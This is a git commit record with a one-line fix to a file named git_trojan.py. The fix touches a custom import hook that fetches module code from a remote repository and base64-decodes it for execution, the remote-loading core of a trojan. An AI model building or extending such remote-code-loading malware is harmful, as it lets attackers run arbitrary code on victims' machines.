dfdd4fc5b24b0307de2962d12a92532e3dafbdeb
HejunweiCoder <405947712@qq.com>
2016-01-05 18:14:59 +0800

    Update git_trojan.py

--- git_trojan.py
+++ git_trojan.py
@@ -72,7 +72,7 @@ class GitImport(object):
     def find_module(self,fullname,path=None):
         if configured:
             print "[*] Attempting to retrieve %s" % fullname
-            new_library=get_file_contents("modules/%s" %s fullname)
+            new_library=get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
                 self.current_module_code=base64.b64decode(new_library)
